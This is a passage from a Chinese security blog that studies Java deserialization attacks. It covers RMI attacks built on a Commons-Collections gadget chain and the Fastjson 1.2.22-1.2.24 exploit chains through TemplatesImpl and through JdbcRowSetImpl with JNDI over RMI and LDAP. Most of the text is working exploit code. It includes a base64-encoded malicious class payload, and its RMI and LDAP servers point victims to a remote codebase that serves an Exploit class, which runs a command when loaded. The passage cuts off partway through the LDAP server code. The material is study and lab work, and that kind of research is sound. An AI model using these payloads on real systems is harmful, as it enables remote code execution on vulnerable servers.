当服务端对实现了HelloService接口并继承了UnicastRemoteObject类的HelloServiceImpl实例化时，在其父类UnicastRemoteObject中，会对当前对象进行导出，返回一个当前对象的stub，也就是HelloService_stub，在其执行registry.bind(&quot;hello&quot;, helloService);的时候，会把这个stub对象，发送到RMI Registry存根。 当客户端执行HelloService helloService = (HelloService) registry.lookup(&quot;hello&quot;)的时候，就会从RMI Registry获取到服务端存进去的stub。 接着客户端就可以通过stub对象，对服务端发起一个远程方法调用helloService.sayHello()，stub对象内部存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，对开发者完全透明。 RMI攻击实例定义一个接口sayHello 12345public interface RemoteHello extends Remote &#123; String sayHello(String name) throws RemoteException; String exp1(Object work) throws RemoteException; Object exp2() throws Exception;&#125; 定义接口实现类其中： exp1是客户端攻击服务端接口； exp2是服务端攻击客户端接口； 1234567891011121314151617181920212223242526272829303132333435363738public class RemoteHelloImpl implements RemoteHello &#123; @Override public String sayHello(String name) throws RemoteException &#123; return String.format (\"Hello, %s!\", name); &#125; @Override public String exp1(Object exp) throws RemoteException &#123; System.out.println(\"exp1 is \" + exp); return \"exp1\"; &#125; @Override public Object exp2() throws Exception &#123; System.out.println(\"exp2\"); return payload(); &#125; public static Object payload() throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"lala\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, transformedMap); return instance; &#125;&#125; Server&amp;Registry创建RMI Registry，创建远程对象，绑定Name和远程对象，运行RMI服务器 123456789101112131415161718192021public class Server &#123; public static void main(String[] args) throws RemoteException, MalformedURLException &#123; try &#123; //实例化对象 RemoteHello h = new RemoteHelloImpl(); //用于导出远程对象，将此服务转换为远程服务接口 RemoteHello skeleton = (RemoteHello) UnicastRemoteObject.exportObject(h, 0); //// 将RMI服务注册到1099端口: LocateRegistry.createRegistry(1099); // 注册此服务，服务名为\"Hello\": //Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h); Naming.rebind(\"Hello\", h); System.out.println(\"[*]Biding is OVER!\"); &#125; catch (RemoteException e) &#123; e.printStackTrace(); &#125; catch (MalformedURLException e) &#123; e.printStackTrace(); &#125; &#125;&#125; Client123456789101112public class Client &#123; public static void main(String[] args) throws RemoteException, NotBoundException &#123; // 连接到服务器localhost，端口1099: Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); // 查找名称为\"Hello\"的服务并强制转型为Hello接口: RemoteHello h = (RemoteHello) registry.lookup(\"Hello\"); // 正常调用接口方法: String rs = h.sayHello(\"0range\"); // 打印调用结果: System.out.println(rs); &#125;&#125; 以上为基本操作，接下来进行攻击。 JDK:1.7u21 JAR:Commons-Collections3.1 Maven; 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; 客户端攻击服务器先上代码： 1234567891011121314151617181920212223242526272829303132333435public class PoC_Client2Server &#123; public static void main(String[] args) throws Exception &#123; // 连接到服务器localhost，端口1099: Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); // 查找名称为\"Hello\"的服务并强制转型为Hello接口: RemoteHello h = (RemoteHello) registry.lookup(\"Hello\"); // 正常调用接口方法: //String rs = h.sayHello(\"rai4over\"); String rs = h.exp1(payload()); // 打印调用结果: System.out.println(rs); &#125; public static Object payload() throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"lala\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, transformedMap); return instance; &#125;&#125; 结果如图： 如果客户端传递给服务端恶意序列化对象，服务端反序列化这个对象时，就会调用对象的readObject就会遭到攻击。 服务器攻击客户端反之，服务端同样可以通过恶意反序列化数据攻击客户端。 先上代码： 123456789101112131415public class PoC_Server2Client &#123; public static void main(String[] args) throws Exception &#123; // 连接到服务器localhost，端口1099: Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); // 查找名称为\"Hello\"的服务并强制转型为Hello接口: RemoteHello h = (RemoteHello) registry.lookup(\"Hello\"); // 正常调用接口方法: //String rs = h.sayHello(\"rai4over\"); //String rs = h.exp1(payload()); Object rs = h.exp2(); // 打印调用结果: System.out.println(rs); &#125;&#125; 攻击截图： 总结对于第一种客户端攻击服务器，其实是客户端自己有payload恶意函数，序列化对象发送给服务器时进行反序列化，造成漏洞触发。 第二种服务器攻击客户端，其实是服务器内部本身就有payload恶意函数，当对象请求调用的时候，服务器将序列化对象返还给客户端，客户端本地进行反序列化，漏洞遭到触发。 参考博客","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"RMI","slug":"RMI","permalink":"https://0range228.github.io/tags/RMI/"}]},{"title":"Fastjson学习笔记02","slug":"Fastjson学习笔记02","date":"2020-06-24T12:34:05.000Z","updated":"2021-09-09T08:36:01.477Z","comments":true,"path":"Fastjson学习笔记02/","link":"","permalink":"https://0range228.github.io/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/","excerpt":"序言 冯唐易老，李广难封。 前一篇总结了fastjson的基础知识，今天来介绍由它引起的一系列漏洞。","text":"序言 冯唐易老，李广难封。 前一篇总结了fastjson的基础知识，今天来介绍由它引起的一系列漏洞。 1.2.22-1.2.24反序列化漏洞对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链： 基于TemplateImpl； 基于JNDI（又分为基于Bean Property类型和Field类型）； 需要的jar包直接贴出pom.xml文件： 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;version&gt;1.12&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; maven还是好用鸭，几行搞定 基于TemplateImpl的利用链最早是廖师傅提出来的。 限制需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。 复现利用恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到： 1234567891011121314public class Test extends AbstractTranslet &#123; public Test() throws IOException &#123; Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; Test t = new Test(); &#125;&#125; 在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。 PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到： 123456789101112131415161718192021222324252627282930313233public class PoC &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"/target/classes/TemplateImpl/Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':&#123; &#125;,\\\"_outputProperties\\\":&#123; &#125;,\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"&#125;\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行即可弹出计算器： 关键看输出的构造的PoC： 1&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125; PoC中几个重要的Json键的含义： @type指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField； _bytecodes是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。 _outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行； _tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置； 在这个poc中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes，_name都是是私有属性，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。 _tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。接下来我们看下TemplatesImpl类的几个关键函数： getOutputProperties newTransformer getTransletInstance defineTransletClasses 12345678public synchronized Properties getOutputProperties() &#123; try &#123; return newTransformer().getOutputProperties(); &#125; catch (TransformerConfigurationException e) &#123; return null; &#125;&#125; 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 12345678910111213141516171819202122232425262728private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new Hashtable(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也就到了最终的执行命令的位置Runtime.getRuntime.exec() 调试分析下面我们直接在反序列化的那句代码上打上断点进行调试分析： 1Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); 在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化： 跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数： 继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析： 在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”： 往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，并调用TypeUtils.loadClass()函数加载该类： 跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说这两个判断条件是后面补丁绕过的漏洞点，值得注意： 往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类： 跟进去，循环扫描解析，解析到key为_bytecodes时，调用parseField()进一步解析： 跟进DefaultFieldDeserializer.parseField()函数中，解析出_bytecodes对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据： FieldDeserializer.setValue()函数，看到是调用private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes的set方法来设置_bytecodes的值： 返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。 经过漫长的跟进之后，当解析到_outputProperties的内容时，看到前面的下划线被去掉了： 跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法： 从invoke的地方跟进去，看到在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法： 跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法： 继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）： 这个类会被放在_class属性中 再往下就是新建Test类实例的过程，并调用Test类的构造函数： 再之后就是弹计算器了。 整个调试过程主要的函数调用栈如下： 1234567891011121314151617181920212223242526&lt;init&gt;:11, TestnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:57, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:526, Constructor (java.lang.reflect)newInstance:383, Class (java.lang)getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:57, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:606, Method (java.lang.reflect)setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)parseObject:339, JSON (com.alibaba.fastjson)parseObject:302, JSON (com.alibaba.fastjson)main:35, PoC 最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。 调用链： 1234567getOutputProperties newTransformer getTransletInstance defineTransletClasses loader.defineClass(_bytecodes[i]); Class.newInstance Evil.init() 为什么恶意类需要继承AbstractTranslet类?在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下： 可以看到有个逻辑会判断恶意类的父类类名是否是ABSTRACT_TRANSLET，是的话_transletIndex变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。 为什么需要对_bytecodes进行Base64编码可以发现，在PoC中的_bytecodes字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对_bytecodes字段进行Base64加密处理。 其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理： 123456789101112public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) &#123; final JSONLexer lexer = parser.lexer; if (lexer.token() == JSONToken.NULL) &#123; lexer.nextToken(JSONToken.COMMA); return null; &#125; if (lexer.token() == JSONToken.LITERAL_STRING) &#123; byte[] bytes = lexer.bytesValue(); lexer.nextToken(JSONToken.COMMA); return (T) bytes; &#125; 我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的： 跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的： 跟进bytesValue()函数，就是对_bytecodes的内容进行Base64解码： 为什么需要设置_tfactory为{}由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到_tfactory.getExternalExtensionsMap()方法，若_tfactory为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用： 为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法?getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。 如何关联_outputProperties与getOutputProperties()方法?Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。 具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法： 1234public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues) &#123; JSONLexer lexer = parser.lexer; // xxx FieldDeserializer fieldDeserializer = smartMatch(key); 在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的_，从而使得_outputProperties变成了outputProperties： 既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。 那么整个调用栈如下； 简单来说就是： 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 基于JdbcRowSetImpl的利用链基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。 限制由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。 基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。 JNDI+RMI复现利用PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型： 12345&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125; JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference： 12345678910public class JNDIServer &#123; public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123; Registry registry = LocateRegistry.createRegistry(1099); //http://127.0.0.1:8000/Exploit.class即可 Reference reference = new Reference(\"Exloit\", \"Exploit\",\"http://127.0.0.1:8000/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Exploit\",referenceWrapper); &#125;&#125; Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中： 12345678910111213public class Exploit&#123; public Exploit() &#123; try &#123; Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; Exploit e = new Exploit(); &#125;&#125; JdbcRowSetImplPoc.java： 123456public class JdbcRowSetImplPoc &#123; public static void main(String[] argv)&#123; String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://localhost:1099/Exploit\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parse(payload); &#125;&#125; 先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务,注意这次和上次一样，恶意类里面还是不要写package的名字： JNDI+LDAP复现利用PoC如下，跟RMI的相比只是改了URL而已： 12345&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125; 但是相比RMI的利用方式，优势在于JDK的限制更低了。 LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182public class LdapServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8000/#Exploit\"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * 